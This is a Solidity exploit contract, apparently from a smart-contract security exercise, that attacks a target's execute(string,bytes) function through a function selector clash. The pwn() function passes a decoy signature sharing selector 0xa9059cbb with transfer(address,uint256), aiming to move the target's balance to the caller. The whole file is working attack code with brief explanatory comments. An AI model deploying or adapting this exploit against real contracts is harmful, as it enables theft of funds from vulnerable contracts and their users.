// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract FunctionSelectorClashExploit {
    address public immutable target;

    constructor(address _target) {
        target = _target;
    }

    // Receive ETH from target
    receive() external payable {}

    function pwn() external {
        // Both "transfer(address,uint256)" and "func_2093253501(bytes)"
        // have the same function selector
        // 0xa9059cbb
        
        // Call target.execute to transfer(address,uint256) by passing in a
        // function signature that is not "transfer(address,uint256)" but
        // has the same function selector 0xa9059cbb
        (bool ok, ) = target.call(abi.encodeWithSignature(
            "execute(string,bytes)",
            "func_2093253501(bytes)",
             // encode transfer(address,uint256) inputs
             abi.encode(msg.sender, target.balance)
            )
        );
        require(ok, "pwn failed");
    }
}